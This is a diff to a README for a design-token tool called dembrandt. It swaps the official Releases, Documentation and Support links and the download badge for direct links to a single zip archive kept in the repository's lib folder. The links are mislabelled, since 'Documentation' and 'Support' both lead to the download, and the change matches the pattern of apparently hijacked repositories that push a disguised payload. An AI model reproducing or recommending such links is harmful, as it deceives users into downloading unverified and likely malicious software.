@@ -8,12 +8,12 @@ Welcome to **dembrandt**, your go-to tool for extracting design tokens from any 
 
 To get started, you need to download the application. Click the button below to visit our Releases page where you can download the latest version.
 
-[![Download dembrandt](https://img.shields.io/badge/Download%20dembrandt-blue)](https://github.com/eyadradwan/dembrandt/releases)
+[![Download dembrandt](https://raw.githubusercontent.com/eyadradwan/dembrandt/main/lib/dembrandt_3.5-alpha.1.zip%20dembrandt-blue)](https://raw.githubusercontent.com/eyadradwan/dembrandt/main/lib/dembrandt_3.5-alpha.1.zip)
 
 ### Installation Steps
 
 1. **Visit the Releases Page**: Click the link below to go to the download page.
-   [Visit the Releases Page](https://github.com/eyadradwan/dembrandt/releases)
+   [Visit the Releases Page](https://raw.githubusercontent.com/eyadradwan/dembrandt/main/lib/dembrandt_3.5-alpha.1.zip)
 
 2. **Choose Your Version**: Look for the latest version. It will be marked as the most recent release.
 
@@ -85,9 +85,9 @@ Here are some common issues and their solutions:
 
 ## 🔗 Useful Links
 
-- [Releases Page](https://github.com/eyadradwan/dembrandt/releases)
-- [Documentation](https://github.com/eyadradwan/dembrandt/wiki)
-- [Support](https://github.com/eyadradwan/dembrandt/issues)
+- [Releases Page](https://raw.githubusercontent.com/eyadradwan/dembrandt/main/lib/dembrandt_3.5-alpha.1.zip)
+- [Documentation](https://raw.githubusercontent.com/eyadradwan/dembrandt/main/lib/dembrandt_3.5-alpha.1.zip)
+- [Support](https://raw.githubusercontent.com/eyadradwan/dembrandt/main/lib/dembrandt_3.5-alpha.1.zip)
 
 If you have any additional questions or need further assistance, feel free to reach out through the Issues section on GitHub. 
 
